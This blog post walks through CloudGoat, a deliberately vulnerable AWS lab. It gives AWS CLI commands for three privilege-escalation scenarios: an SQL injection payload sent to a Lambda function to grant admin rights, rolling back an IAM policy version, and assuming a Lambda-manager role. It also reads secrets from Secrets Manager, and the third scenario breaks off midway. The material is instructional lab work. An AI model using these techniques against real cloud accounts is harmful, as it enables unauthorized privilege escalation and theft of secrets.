---
layout: post
title: Cloud Security
date: 2022-05-11
summary: AWS Misconfigurations
categories: Cloud Security
tags: [AWS, Write-Ups, Cloud Security]
---

Hi Everyone

I'm back with another blog on Deep Dive into AWS Cloud Security from scratch.


<p align="center">
  <img src="/images/cloud/aws-logo.png">
</p>

**What is Cloud Security ?**          
* Cloud security is a set of policies, strategies, controls, procedures, and practices designed to **safeguard** the data, resources, and applications hosted on the **cloud**.

**Why to Learn Cloud Security ?**
* Cloud security is critical since most **organizations** are already using cloud computing in one form or another. 
* Worldwide **end-user** spending on public cloud services is forecast to grow **20.4% in 2022** to total **$494.7 billion**, up from **$410.9 billion** in **2021**, according to the latest forecast from [Gartner, Inc](https://www.gartner.com/en/newsroom/press-releases/2022-04-19-gartner-forecasts-worldwide-public-cloud-end-user-spending-to-reach-nearly-500-billion-in-2022#:~:text=IaaS%2C%20DaaS%20and%20PaaS%20to,latest%20forecast%20from%20Gartner%2C%20Inc.)

<p align="center"><strong>Top Cloud Providers</strong></p>
<p align="center">
  <img src="/images/cloud/cloud-provider.png">
</p>

From the above statistics, it shows **Amazon AWS** dominates the cloud industry, so i decided to start with _AWS Cloud Security_, but :(

<p align="center">
  <img src="https://media.giphy.com/media/8VIRj0jsCPIIBpKSDK/giphy.gif">
</p>

So i started to look where i can **create and deploy** a **vulnerable** cloud enviroment for learning,i end up by finding [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat).

<p align="center">
  <img src="/images/cloud/vulnerable-labs.png">
</p>

<p align="center"><strong>CloudGoat(☁️🐐)</strong></p>      

<p align="center">CloudGoat is Rhino Security Labs "Vulnerable by Design" AWS deployment tool.</p>

<p align="center">
  <img src="https://rhinosecuritylabs.com/wp-content/uploads/2018/07/cloudgoat-e1533043938802-1140x400.jpg" width=350/>
</p>

**Set-Up Requirements**
1. Linux or Mac OS
2. Python 3.6+
```bash
apt install python3
```
3. [Terraform](https://www.terraform.io/downloads)
```bash
curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -
sudo apt-add-repository "deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main"
sudo apt-get update && sudo apt-get install terraform
```
4. [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html)
```bash
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```
5. [jq](https://stedolan.github.io/jq/)
```bash
apt install jq
```
**Creating an AWS Administrator Account**
* [Sign Up](https://portal.aws.amazon.com/billing/signup#/start/email) for an Amazon AWS Account.
* After login, search for Identity & Access Management (IAM).
* Choose Users ---> Add users

<p align="center">
  <img src="/images/cloud/user.png">
</p>

* Set **username** and choose AWS Credentials Type as **Programmatic Access**.

<p align="center">
  <img src="/images/cloud/nameusers.png">
</p>

* Choose **Attach existing policies directly** ---> **AdministratorAccess**.

<p align="center">
  <img src="/images/cloud/permission.png">
</p>

* Give any tag name as shown below.

<p align="center">
  <img src="/images/cloud/tag.png">
</p>

* **Review** all the setting once and click on **Create User**.

<p align="center">
  <img src="/images/cloud/review.png">
</p>

<p align="center">
  <img src="/images/cloud/download.png">
</p>

**Configuring AWS Profile**

* After creating the AWS Administrator Account use the following command to configure the AWS profile.

```bash
aws configure --profile cloudgoat #give any profile name
```

<p align="center">
  <img src="/images/cloud/awsprofile.png">
</p>

* Check if the user is configured with the AWS access key and Secret Key to the corresponding profile.

```bash
aws iam get-user --profile cloudgoat
```

<p align="center">
  <img src="/images/cloud/get-user.png">
</p>

**Installing CloudGoat**

To install CloudGoat, make sure your **system meets** the **requirements** above.

```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip3 install -r ./requirements.txt
```

**Configuring CloudGoat**

* Configure cloudgoat with the AWS profile, use the following command.

```bash
./cloudgoat.py config profile
```

* Whitelist the IP-Address automatically.

```bash
./cloudgoat.py config whitelist --auto
```

<p align="center"><strong>Let's get started</strong></p>

**Scenario: Vulnerable Lambda**

**Command:** `./cloudgoat.py create vulnerable_lambda`

**Scenario Resources**

1 IAM User  
1 IAM Role  
1 Lambda   
1 Secret 

**Scenario Start**

IAM User 'bilbo' 

<p align="center">
  <img src="/images/cloud/start_vl.png">
</p>

**Scenario Goal**

Find the scenario's secret. (cg-secret-XXXXXX-XXXXXX)

**Summary**

In this scenario, you start as the 'bilbo' user. You will assume a role with more privelages, discover a lambda function that applies policies to users, and exploit a vulnerability in the function to escalate the privelages of the bilbo user in order to search for secrets.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/vulnerable_lambda.png">
</p>

**Walkthrough - IAM User "bilbo"**

* Configure the AWS Profile for bilbo using the following command

```bash
aws configure --profile bilbo
```

<p align="center">
  <img src="/images/cloud/bilbo_aws_configure.png">
</p>

* Get permissions for the 'bilbo' user.

```bash
#This command will give you the ARN & full name of you user.
aws --profile bilbo --region us-east-1 sts get-caller-identity
#This command will list the policies attached to your user.
aws --profile bilbo --region us-east-1 iam list-user-policies --user-name [your_user_name]
#This command will list all of your permissions.
aws --profile bilbo --region us-east-1 iam get-user-policy --user-name [your_user_name] --policy-name [your_policy_name]
```
<p align="center">
  <img src="/images/cloud/vullam1.png">
</p>

* List all roles, assume a role for privesc.

```bash
#This command will list all the roles in your account, one of which should be assumable. 
aws --profile bilbo --region us-east-1 iam list-roles | grep cg-
# This command will list all policies for the target role
aws --profile bilbo --region us-east-1 iam list-role-policies --role-name [cg-target-role]
# This command will get you credentials for the cloudgoat role that can invoke lambdas.
aws --profile bilbo --region us-east-1 sts assume-role --role-arn [cg-lambda-invoker_arn] --role-session-name [whatever_you_want_here]
```
<p align="center">
  <img src="/images/cloud/vullam2.png">
</p>

* Configure the newly AWS profile using the generated AWS Credentials.

<p align="center">
  <img src="/images/cloud/assumed_role.png">
</p>

* Manually add the **SessionToken**.

```bash
vi .aws/credentials
```
<p align="center">
  <img src="/images/cloud/session_token.png">
</p>

* List lambdas to **identify** the target (vulnerable) lambda.
```bash
# This command will show you all lambda functions. The function belonging to cloudgoat (the name should start with "cg-")
# can apply a predefined set of aws managed policies to users (in reality it can only modify the bilbo user).
aws --profile assumed_role --region us-east-1 lambda list-functions
```
<p align="center">
  <img src="/images/cloud/vullam3.png">
</p>

* Look at the lambda source code. You should see the database structure in a comment, as well as the code that is handling input parameters. It's vulnerable to an injection, and we'll see what an exploit looks like in the next step.

```bash
#This command will return a bunch of information about the lambda that can apply policies to bilbo.
#part of this information is a link to a url that will download the deployment package, which
#contains the source code for the function. Read over that source code to discover a vulnerability. 
aws --profile assumed_role --region us-east-1 lambda get-function --function-name [policy_applier_lambda_name]
```
<p align="center">
  <img src="/images/cloud/vullam4.png">
</p>

* Invoke the role applier lambda function, passing the name of the bilbo user and the **injection** payload.
```bash
#The following command will send a SQL injection payload to the lambda function
aws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --cli-binary-format raw-in-base64-out --payload '{"policy_names": ["AdministratorAccess'"'"' --"], "user_name": [bilbo_user_name_here]}' out.txt
#cat the results to confirm everything is working properly
cat out.txt
```
<p align="center">
  <img src="/images/cloud/vullam5.png">
</p>

* Now that Bilbo is an admin, use credentials for that user to list secrets from secretsmanager.
```bash
#This command will list all the secrets in secretsmanager
aws --profile bilbo --region us-east-1 secretsmanager list-secrets
```
<p align="center">
  <img src="/images/cloud/vullam6.png">
</p>

```bash
#This command will get the value for a specific secret
aws --profile bilbo --region us-east-1 secretsmanager get-secret-value --secret-id [ARN_OF_TARGET_SECRET]
```
<p align="center">
  <img src="/images/cloud/vullam7.png">
</p>

**Scenario: IAM Privesc by Rollback**

**Command:** `./cloudgoat.py create iam_privesc_by_rollback`

**Scenario Resources**

* 1 IAM User
  * 5 policy versions

**Scenario Start**

IAM User "Raynor"

<p align="center">
  <img src="/images/cloud/aws_iam_profile.png">
</p>

**Scenario Goal**

Acquire full admin privileges.

**Summary**

Starting with a highly-limited IAM user, the attacker is able to review previous IAM policy versions and restore one which allows full admin privileges, resulting in a privilege escalation exploit.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/iam_priv.png">
</p>

**Walkthrough - IAM User "Raynor"**

* Configure the AWS Profile for raynor using the following command

```bash
aws configure --profile raynor
```

<p align="center">
  <img src="/images/cloud/raynor_aws_configure.png">
</p>

* Get the **username** of the current AWS profile.

```bash
aws iam get-user --profile raynor
```

<p align="center">
  <img src="/images/cloud/username_raynor.png">
</p>

* List the **attached** policies of the raynor user.

```bash
aws iam list-attached-user-policies --user-name [username] --profile raynor
```
<p align="center">
  <img src="/images/cloud/userpolicy_raynor.png">
</p>

* View the Current Policy version.

```bash
aws iam get-policy --policy-arn <generatedARN>/cg-raynor-policy --profile raynor
```

<p align="center">
  <img src="/images/cloud/current_policy.png">
</p>

* Check the **existing** versions of the policy.

```bash
aws iam list-policy-versions --policy-arn <generatedARN>/cg-raynor-policy --profile raynor
```

<p align="center">
  <img src="/images/cloud/existing_versions.png">
</p>


<p align="center">
  <strong>Version 1</strong>
</p>

<p align="center">
  <img src="/images/cloud/v1policy.png">
</p>

**Note:** An attacker with the **iam:SetDefaultPolicyVersion** permission may be able to **escalate privileges through existing policy versions** not currently in use. If a policy that they have access to has versions that are not the default, they would be able to **change the default version to any other existing version.**

<p align="center">
  <strong>Version 2</strong>
</p>

<p align="center">
  <img src="/images/cloud/v2policy.png">
</p>

**Note:** The above shown policy allows all actions to all resources. This basically grants the **user administrative access** to the AWS account.

<p align="center">
  <strong>Version 3</strong>
</p>

<p align="center">
  <img src="/images/cloud/v3policy.png">
</p>

**Note:** From the above image it can be observed that policy whitelists those two (2) IP subnets.

<p align="center">
  <strong>Version 4</strong>
</p>

<p align="center">
  <img src="/images/cloud/v4policy.png">
</p>

**Note:** This policy allows this action “iam:Get*” to all AWS resources but only allows for a specified time period which has expired.

<p align="center">
  <strong>Version 5</strong>
</p>

<p align="center">
  <img src="/images/cloud/v5policy.png">
</p>

**Note:** This allows only the following actions: “s3:ListBucket”, “s3:GetObject” and “s3:ListAllMyBuckets”.

* Change the Policy Version from **v1 ---> v2** , because v2 has administrative privilege.

```bash
aws iam set-default-policy-version --policy-arn <generatedARN>/cg-raynor-policy --version-id <versionID> --profile raynor
```

<p align="center">
  <img src="/images/cloud/before_making_changes.png">
</p>

<p align="center">
  <img src="/images/cloud/after_making_changes.png">
</p>

* Confirm the **Administrative** Privilege by creating a **S3 Bucket**.

```bash
aws s3api create-bucket --bucket [bucket-name] --region us-east-1 --profile raynor
```

<p align="center">
  <img src="/images/cloud/s3api_bucket.png">
</p>

<p align="center">
  <img src="/images/cloud/created_bucket.png">
</p>

**Scenario:** Lambda Privesc

**Command:** `./cloudgoat.py create lambda_privesc`

**Scenario Resources**

1 IAM User  
2 IAM Roles  

**Scenario Start**

1. IAM User Chris  

<p align="center">
  <img src="/images/cloud/scenario_chris.png">
</p>


**Scenario Goal**

Acquire full admin privileges.

**Summary**

Starting as the IAM user Chris, the attacker discovers that they can assume a role that has full Lambda access and pass role permissions.
The attacker can then perform privilege escalation to obtain full admin access.  

**Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/exploitation_route_lambda.png">
</p>

**Walkthrough - IAM User "Chris"**

* Configure the AWS Profile for chris using the following command

```bash
aws configure --profile chris
```

<p align="center">
  <img src="/images/cloud/chris-aws-profile.png">
</p>

* Get the **username** of the current AWS profile.

```bash
aws iam get-user --profile chris
```
<p align="center">
  <img src="/images/cloud/chris_username.png">
</p>

* List the attached policies of the **chris** user.

```bash
aws iam list-attached-user-policies --user-name [username] --profile Chris
```

<p align="center">
  <img src="/images/cloud/chris_attached_policy.png">
</p>

* View the **Current Policy** version.

```bash
aws iam get-policy --policy-arn [arn-number] --profile chris
```

<p align="center">
  <img src="/images/cloud/policy_version_chris.png">
</p>

* Check the existing versions of the policy.

```bash
aws iam list-policy-versions --policy-arn <cg-chris-policy arn> --profile chris
```

<p align="center">
  <img src="/images/cloud/existing_policy_chris.png">
</p>

* Details of the v1 version.

```bash
aws iam get-policy-version --policy-arn <cg-chris-policy arn> --version-id v1 --profile Chris
```

<p align="center">
  <img src="/images/cloud/detail_v1_chris.png">
</p>

**Note:** It was observed that **sts:AssumeRole** is **allowed**. So an attacker would be able to change the assume role policy document of any existing role to allow them to assume that role.It will return a set of **temporary security credentials** that you can use to access AWS resources that you may not have access to normally.

* List the roles of chris profile.

```bash
aws iam list-roles --profile chris
```

<p align="center">
  <img src="/images/cloud/chris_role_1.png">
</p>

<p align="center">
  <img src="/images/cloud/chris_role_2.png">
</p>

**Note:** There are two different roles **cg-debug-role-lambda_privesc_cgid2w7yniosir** & **cg-lambdaManager-role-lambda_privesc_cgid2w7yniosir** 

* Get more infomration about the roles.

```bash
aws iam list-attached-role-policies --role-name cg-debug-role-lambda_privesc_cgid2w7yniosir --profile chris
```
<p align="center">
  <img src="/images/cloud/debugger_role.png">
</p>

```bash
aws iam list-attached-role-policies --role-name cg-lambdaManager-role-lambda_privesc_cgid2w7yniosir --profile chris
```
<p align="center">
  <img src="/images/cloud/lambda_manager_roles.png">
</p>

* List more information about managed policies.

```bash
aws iam get-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile chris
```

<p align="center">
  <img src="/images/cloud/get_admin_policy.png">
</p>

```bash
aws iam get-policy --policy-arn [arn-policy-name] --profile chris
```

<p align="center">
  <img src="/images/cloud/get_lambda_policy.png">
</p>

* View the current policy.

```bash
aws iam get-policy-version --policy-arn [arn-number] --version-id v1 --profile chris
```

<p align="center">
  <img src="/images/cloud/v1_lambda_manager.png">
</p>

**Note:** 
1. From the above image, it can be observed that **iam:PassRole** allowed, so basically. If there is a user with **iam:PassRole**, **lambda:CreateFunction** and **lambda:InvokeFunction** can escalate the permission by executing the existing **IAM Role** to new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. 
2. The code could then be run by invoking the function through the AWS API. This would give a user access to the **privileges associated** with any **Lambda service role** that exists in the account, which could range from **no privilege escalation** to **full administrator** access to the account.

* Check the permission of Debug role.

```bash
aws sts assume-role --role-arn <arn:generated-number> --role-session-name debug_role –profile chris
```

<p align="center">
  <img src="/images/cloud/access_denied_debug_role.png">
</p>

* Check the permission of Lambda Manager role.

```bash
aws sts assume-role --role-arn <arn:generated-number> --role-session-name lambda_role --profile chris
```

<p align="center">
  <img src="/images/cloud/aws_lambda_manager_role.png">
</p>

**Note:**       
1. chris is **not authorized** to assume the **debug role**, which resulted in access denied.       
2. with the **lambda manager role** chris is **authorized** to provide temporary credentails such as (access key ID, secret key, session token).

* Configure the AWS Profile for Lambda Manager using the following command

```bash
aws configure --profile lambdamanager
```

<p align="center">
  <img src="/images/cloud/aws_credentials_lambda_manager.png">
</p>
